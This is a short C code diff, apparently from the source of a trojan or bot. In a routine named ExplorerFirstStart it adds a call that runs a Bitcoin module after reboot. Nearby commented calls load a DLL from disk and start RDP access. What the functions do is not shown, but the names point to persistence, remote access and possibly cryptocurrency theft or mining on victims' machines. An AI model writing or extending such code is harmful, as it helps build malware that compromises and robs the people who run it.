@@ -55,6 +55,9 @@ void ExplorerFirstStart(PEventData Data)
 	#endif
 	#endif
 
+	#ifdef BitcoinH
+		BitcoinRunAfterReboot();
+	#endif
 	//ExecuteDocFind( 0, 0, 0 );
 	//ExecuteLoadDLLDisk( 0, 0, "testdll.dll" );
 //	ExecuteRunRDP( 0, 0, 0 );
